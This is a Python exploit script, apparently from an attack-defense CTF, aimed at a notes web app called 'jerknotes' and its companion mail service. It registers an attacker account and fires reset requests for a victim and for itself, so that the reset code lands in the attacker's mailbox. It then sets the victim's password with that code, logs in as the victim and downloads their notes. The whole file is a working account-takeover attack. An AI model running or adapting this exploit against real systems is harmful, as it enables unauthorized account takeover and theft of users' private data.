#!/usr/bin/env python3
import requests
import random
import checklib
import sys

IP = sys.argv[1]
BASE_APP = f"http://{IP}:31338"
BASE_MAIL = f"http://{IP}:31337"
JURY_IP = "10.10.10.10"

proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def get_attack_data():
    return requests.get(f"http://{JURY_IP}/api/client/attack_data").json()['jerknotes'][IP]

def reg(email, password):
    burp0_url = f"{BASE_MAIL}/register"
    burp0_headers = {"sec-ch-ua-platform": "\"macOS\"", "Accept-Language": "en-US,en;q=0.9", "sec-ch-ua": "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"", "Content-Type": "application/json", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36", "Accept": "*/*", "Origin": "http://localhost:31337", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "http://localhost:31337/login", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    burp0_json={"email":email, "password": password}
    requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
    
    mail_sess = requests.Session()
    
    burp0_url = f"{BASE_MAIL}/login"
    burp0_headers = {"sec-ch-ua-platform": "\"macOS\"", "Accept-Language": "en-US,en;q=0.9", "sec-ch-ua": "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"", "Content-Type": "application/json", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36", "Accept": "*/*", "Origin": "http://localhost:31337", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "http://localhost:31337/login", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    burp0_json={"email": email, "password": password}
    mail_sess.post(burp0_url, headers=burp0_headers, json=burp0_json)



    app_sess = requests.Session()

    burp0_url = f"{BASE_APP}/auth/register"
    burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"macOS\"", "Accept-Language": "en-US,en;q=0.9", "Origin": "http://localhost:31338", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://localhost:31338/auth/register", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    burp0_data = {"username": email, "password": password, "confirm-password": password}
    app_sess.post(burp0_url, headers=burp0_headers, data=burp0_data)

    return mail_sess, app_sess


def get_notes(session):
    burp0_url = f"{BASE_APP}/api/files/list"
    burp0_headers = {"sec-ch-ua-platform": "\"macOS\"", "Accept-Language": "en-US,en;q=0.9", "sec-ch-ua": "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36", "sec-ch-ua-mobile": "?0", "Accept": "*/*", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "http://localhost:31338/profile/notes", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    try:
        filenames = session.get(burp0_url, headers=burp0_headers).json()
    except:
        filenames = []
    content = []
    for file in filenames:
        burp0_url = f"{BASE_APP}/api/files/download/{file}"
        burp0_headers = {"sec-ch-ua-platform": "\"macOS\"", "Accept-Language": "en-US,en;q=0.9", "sec-ch-ua": "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36", "sec-ch-ua-mobile": "?0", "Accept": "*/*", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "http://localhost:31338/profile/notes", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
        content.append(session.get(burp0_url, headers=burp0_headers).text)
    return content


def get_reset_code(session):
    burp0_url = f"{BASE_MAIL}/mails"
    burp0_headers = {"sec-ch-ua-platform": "\"macOS\"", "Accept-Language": "en-US,en;q=0.9", "sec-ch-ua": "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36", "sec-ch-ua-mobile": "?0", "Accept": "*/*", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "http://localhost:31337/mails_page", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    mails =  session.get(burp0_url, headers=burp0_headers).json()[0]['content'].split('.')[0].split(':')[1].strip()
    return mails


def attack(email_target, email_controled, mail_sess, newpass):

    burp0_url = f"{BASE_APP}/auth/reset"
    burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"macOS\"", "Accept-Language": "en-US,en;q=0.9", "Origin": "http://localhost:31338", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://localhost:31338/auth/reset", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    burp0_data = {"email": email_target}
    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

    burp0_url = f"{BASE_APP}/auth/reset"
    burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"macOS\"", "Accept-Language": "en-US,en;q=0.9", "Origin": "http://localhost:31338", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://localhost:31338/auth/reset", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    burp0_data = {"email": email_controled}
    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

    reset_code = get_reset_code(mail_sess)

    burp0_url = f"{BASE_APP}/auth/setpass"
    burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"macOS\"", "Accept-Language": "en-US,en;q=0.9", "Origin": "http://localhost:31338", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://localhost:31338/auth/setpass?email=admin@penis.com", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    burp0_data = {"email": email_target, "resetCode": reset_code, "newPassword": newpass}
    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)


    victim_sess = requests.Session()
    #victim_sess.proxies.update(proxies)
    burp0_url = f"{BASE_APP}/auth/login"
    burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"macOS\"", "Accept-Language": "en-US,en;q=0.9", "Origin": "http://localhost:31338", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://localhost:31338/auth/login", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    burp0_data = {"username": email_target, "password": newpass}
    victim_sess.post(burp0_url, headers=burp0_headers, data=burp0_data)

    notes = get_notes(victim_sess)
    return notes





if __name__ == "__main__":
    mail, passwd = checklib.rnd_username(), checklib.rnd_password()
    mail_sess, app_sess = reg(mail, passwd)
    victims = get_attack_data()
    for lox in victims:
        print(attack(lox,mail, mail_sess, checklib.rnd_password()),flush=True)
    


